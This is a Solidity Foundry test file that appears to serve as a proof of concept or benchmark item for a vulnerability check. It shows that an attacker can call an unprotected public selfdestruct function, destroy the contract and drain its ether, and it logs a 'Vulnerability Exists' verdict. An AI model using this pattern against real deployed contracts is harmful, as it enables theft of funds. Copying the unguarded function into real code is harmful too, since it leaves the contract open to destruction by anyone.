// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/simple_suicide.sol";

contract SimpleSuicideTest is Test {
    SimpleSuicide public simpleSuicide;
    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");
    uint256 public constant TEST_AMOUNT = 1 ether;

    function setUp() public {
        vm.prank(deployer);
        simpleSuicide = new SimpleSuicide();
    }

    function testAnyoneCanDestroyContractAndStealFunds() public {
        // Fund contract with 1 ether
        vm.deal(address(simpleSuicide), TEST_AMOUNT);
        
        console2.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(simpleSuicide).balance;
        uint256 contractBalanceFromFunctionBefore = simpleSuicide.getContractBalance();
        uint256 attackerBalanceBefore = attacker.balance;
        console2.log("Contract balance (via address) (before):", contractBalanceBefore);
        console2.log("Contract balance (via function) (before):", contractBalanceFromFunctionBefore);
        console2.log("Attacker balance (before):", attackerBalanceBefore);

        console2.log("");
        console2.log("--- Trigger Attack: sudicideAnyone called by attacker ---");
        vm.prank(attacker);
        simpleSuicide.sudicideAnyone(); // This destroys the contract

        console2.log("");
        console2.log("--- AFTER-Trigger ---");
        // Since the contract is destroyed, we cannot call getContractBalance(). We use address balance.
        uint256 contractBalanceAfter = address(simpleSuicide).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console2.log("Contract balance (via address) (after):", contractBalanceAfter);
        console2.log("Attacker balance (after):", attackerBalanceAfter);

        // Conditions for successful exploitation:
        bool contractBalanceZero = (contractBalanceAfter == 0);
        bool attackerReceivedFunds = (attackerBalanceAfter == attackerBalanceBefore + contractBalanceBefore);
        bool exploitSuccessful = contractBalanceZero && attackerReceivedFunds;
        
        console2.log("");
        console2.log("--- Verdict ---");
        if (exploitSuccessful) {
            console2.log("Vulnerability Exists: Attacker successfully destroyed the contract and stole the funds");
        } else {
            console2.log("Vulnerability not Exist: The contract was not destroyed or the attacker did not receive the funds");
        }
        
        // Final verdict line as required
        if (exploitSuccessful) {
            console2.log("Vulnerability Exists: Funds stolen and contract destroyed via public selfdestruct");
        } else {
            console2.log("Vulnerability not Exist: Attack did not successfully transfer funds or destroy contract");
        }
    }

    function testContractBalanceTransferredToAttacker() public {
        // Fund contract
        vm.deal(address(simpleSuicide), TEST_AMOUNT);
        uint256 initialBalance = address(simpleSuicide).balance;
        
        // Launch attack
        vm.prank(attacker);
        simpleSuicide.sudicideAnyone();
        
        // Verify fund transfer
        assertEq(
            attacker.balance,
            initialBalance,
            "Attacker should receive contract's ETH"
        );
    }

    function testAnyoneCanCallSelfDestructFunction() public {
        // Verify no permission checks
        vm.prank(address(0xdead));
        simpleSuicide.sudicideAnyone();
    }
}